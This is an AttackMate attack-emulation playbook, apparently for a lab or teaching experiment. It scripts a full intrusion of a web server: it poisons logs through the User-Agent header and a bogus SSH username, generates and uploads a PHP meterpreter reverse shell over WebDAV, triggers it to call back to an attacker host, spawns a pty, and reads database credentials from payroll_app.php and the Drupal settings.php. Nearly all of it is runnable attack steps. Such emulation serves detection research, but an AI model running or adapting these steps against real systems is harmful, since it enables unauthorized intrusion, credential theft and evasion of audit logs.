#
# Author: AttackMate Initial-Access experiment (MIRANDA teaching example)
# Description:
#     WebDAV foothold -> credential access. We PUT a PHP reverse shell to the PUT-
#     enabled /uploads WebDAV alias and GET it to trigger a meterpreter shell as www-
#     data; we upgrade to a pty and run the standard core (which-python, id, uname),
#     then hunt DB credentials under the web root (grep the PHP, payroll_app.php, drupal
#     settings.php). Enumeration only.
#
#     Tactic flow: Initial Access (PUT/GET web shell) -> Discovery -> Credential Access
#     (Defense Evasion runs throughout: the log-injection marker rides every step.)
#
# AUTHORIZED USE ONLY:
#     Run this only against systems you own or have explicit written permission to test.
#
vars:
  TARGET: 172.28.128.3
  ATTACKER: 172.28.128.10
  LPORT: "4449"
  PAYLOAD: php/meterpreter/reverse_tcp
  RSHELL_URL: http://172.28.128.3/uploads/am_rev.php
  # Log-injection marker. Space-free single token: auditd hex-encodes any argv that
  # contains a space, which would break the marker join across log layers.
  INJECTION: "this_is_the_injection"

commands:

  # ===================== Phase 0: pre-exploit log poisoning =====================
  - type: http-client
    cmd: GET
    url: http://$TARGET/?probe=1
    useragent: "$INJECTION"
    exit_on_error: False
    metadata:
      description: "Benign-looking GET whose User-Agent seeds the marker into the Apache access log"
      techniques: "T1562.006"
      tactics: "Defense Evasion"

  - type: sleep
    seconds: 4
    min_sec: 1
    random: True
    metadata:
      description: "Human-paced jitter between the two probes"

  - type: ssh
    cmd: id
    username: "$INJECTION"
    password: "x"
    hostname: $TARGET
    interactive: False
    exit_on_error: False
    metadata:
      description: "Bogus SSH username injection -> poisons auth.log (Invalid user ...)"
      techniques: "T1110.001,T1562.006"
      tactics: "Credential Access,Defense Evasion"

  # ===================== Phase 1: foothold =====================
  - type: mktemp
    variable: RSHELL
    metadata:
      description: "Prepare a local file for the reverse-shell payload"

  - type: msf-payload
    cmd: $PAYLOAD
    payload_options:
      LHOST: $ATTACKER
      LPORT: $LPORT
    format: raw
    local_path: ${RSHELL}.php
    metadata:
      description: "Generate a PHP meterpreter reverse-shell payload"
      techniques: "T1059.004"
      tactics: "Execution"

  - type: msf-module
    cmd: exploit/multi/handler
    creates_session: rev
    payload: $PAYLOAD
    payload_options:
      LHOST: $ATTACKER
      LPORT: $LPORT
    background: true
    kill_on_exit: true
    metadata:
      description: "Start the multi/handler listener for the reverse shell"
      techniques: "T1071"
      tactics: "Command and Control"

  - type: http-client
    cmd: PUT
    url: $RSHELL_URL
    useragent: "$INJECTION"
    local_path: ${RSHELL}.php
    metadata:
      description: "PUT reverse-shell payload; User-Agent poisons the Apache access log"
      techniques: "T1190,T1105,T1505.003,T1562.006"
      tactics: "Initial Access,Persistence,Command and Control,Defense Evasion"

  - type: sleep
    seconds: 5
    metadata:
      description: "Give the upload a moment to settle"

  - type: http-client
    cmd: GET
    url: $RSHELL_URL
    useragent: "$INJECTION"
    background: true
    kill_on_exit: true
    metadata:
      description: "Trigger payload via GET; User-Agent poisons the Apache access log"
      techniques: "T1190,T1059.004,T1562.006"
      tactics: "Initial Access,Execution,Defense Evasion"

  - type: sleep
    seconds: 10
    metadata:
      description: "Wait for the session to be established"

  # ===================== Phase 2: standard post-landing core =====================
  - type: msf-session
    session: rev
    write: True
    cmd: "shell\n"
    exit_on_error: False
    metadata:
      description: "Drop the meterpreter session to a system shell channel (leave meterpreter behind)"
      techniques: "T1059.004"
      tactics: "Execution"

  - type: sleep
    seconds: 2
    metadata:
      description: "Let the shell channel come up"

  - type: msf-session
    session: rev
    write: True
    cmd: "bash -c 'which python' \"$INJECTION\"\n"
    exit_on_error: False
    metadata:
      description: "Locate a Python interpreter for the pty upgrade; execve poisoned with the marker"
      techniques: "T1518,T1562.006"
      tactics: "Discovery,Defense Evasion"

  - type: sleep
    seconds: 2
    metadata:
      description: "Let the command produce output"

  - type: msf-session
    session: rev
    read: True
    cmd: read-output
    save: /tmp/ia_webdav_ca_which_python.txt
    exit_on_error: False
    metadata:
      description: "Read the which-python output (confirm /usr/bin/python is present)"
      techniques: "T1518"
      tactics: "Discovery"

  # Upgrade the dumb shell to an interactive pty (shell-spawn; left UNWRAPPED so the
  # spawned bash persists on the channel -- a bash -c wrapper would run it in a subshell).
  - type: msf-session
    session: rev
    write: True
    cmd: "python -c 'import pty; pty.spawn(\"/bin/bash\")'\n"
    exit_on_error: False
    metadata:
      description: "Upgrade the shell to an interactive pty via python pty.spawn"
      techniques: "T1059.004"
      tactics: "Execution"

  - type: sleep
    seconds: 2
    metadata:
      description: "Let the pty bash come up"

  - type: msf-session
    session: rev
    write: True
    cmd: "bash -c 'id' \"$INJECTION\"\n"
    exit_on_error: False
    metadata:
      description: "Current identity (expect www-data); execve poisoned with the marker"
      techniques: "T1033,T1562.006"
      tactics: "Discovery,Defense Evasion"

  - type: sleep
    seconds: 2
    metadata:
      description: "Let the command produce output"

  - type: msf-session
    session: rev
    read: True
    cmd: read-output
    save: /tmp/ia_webdav_ca_disc_id.txt
    exit_on_error: False
    metadata:
      description: "Read the id output (foothold proof)"
      techniques: "T1033"
      tactics: "Discovery"

  - type: msf-session
    session: rev
    write: True
    cmd: "bash -c 'uname -a' \"$INJECTION\"\n"
    exit_on_error: False
    metadata:
      description: "Kernel/architecture; execve poisoned with the marker"
      techniques: "T1082,T1562.006"
      tactics: "Discovery,Defense Evasion"

  - type: sleep
    seconds: 2
    metadata:
      description: "Let the command produce output"

  - type: msf-session
    session: rev
    read: True
    cmd: read-output
    save: /tmp/ia_webdav_ca_disc_uname.txt
    exit_on_error: False
    metadata:
      description: "Read the uname output"
      techniques: "T1082"
      tactics: "Discovery"

  # ===================== Category: credential access =====================
  # Hunt DB credentials under the web root. The sweep surfaces any .env/wp-config.php;
  # we then cat the two cred files known to exist on this box.
  - type: msf-session
    session: rev
    write: True
    cmd: "bash -c 'find /var/www -name \"*.php\" | xargs grep -l -iE \"password|db_|mysql\" 2>/dev/null' \"$INJECTION\"\n"
    exit_on_error: False
    metadata:
      description: "Grep web-root PHP for DB credentials; execve poisoned with the marker"
      techniques: "T1552.001,T1083,T1562.006"
      tactics: "Credential Access,Discovery,Defense Evasion"

  - type: sleep
    seconds: 3
    metadata:
      description: "Let the grep sweep finish"

  - type: msf-session
    session: rev
    read: True
    cmd: read-output
    save: /tmp/ia_webdav_ca_phpgrep.txt
    exit_on_error: False
    metadata:
      description: "Read the list of PHP files that reference DB credentials"
      techniques: "T1552.001"
      tactics: "Credential Access"

  - type: msf-session
    session: rev
    write: True
    cmd: "bash -c 'cat /var/www/html/payroll_app.php' \"$INJECTION\"\n"
    exit_on_error: False
    metadata:
      description: "Read the payroll app source (known plaintext DB creds); execve marker"
      techniques: "T1552.001,T1562.006"
      tactics: "Credential Access,Defense Evasion"

  - type: sleep
    seconds: 2
    metadata:
      description: "Let the command produce output"

  - type: msf-session
    session: rev
    read: True
    cmd: read-output
    save: /tmp/ia_webdav_ca_payroll.txt
    exit_on_error: False
    metadata:
      description: "Read the payroll_app.php credentials"
      techniques: "T1552.001"
      tactics: "Credential Access"

  - type: msf-session
    session: rev
    write: True
    cmd: "bash -c 'cat /var/www/html/drupal/sites/default/settings.php' \"$INJECTION\"\n"
    exit_on_error: False
    metadata:
      description: "Read the Drupal settings.php (DB user/password/host); execve marker"
      techniques: "T1552.001,T1562.006"
      tactics: "Credential Access,Defense Evasion"

  - type: sleep
    seconds: 2
    metadata:
      description: "Let the command produce output"

  - type: msf-session
    session: rev
    read: True
    cmd: read-output
    save: /tmp/ia_webdav_ca_settings.txt
    exit_on_error: False
    metadata:
      description: "Read the Drupal DB credentials from settings.php"
      techniques: "T1552.001"
      tactics: "Credential Access"

  - type: debug
    cmd: "[webdav_cred_access] credential access complete -> $RESULT_STDOUT"
    metadata:
      description: "Surface the last credential-access output inline"
      techniques: "T1552.001"
      tactics: "Credential Access"
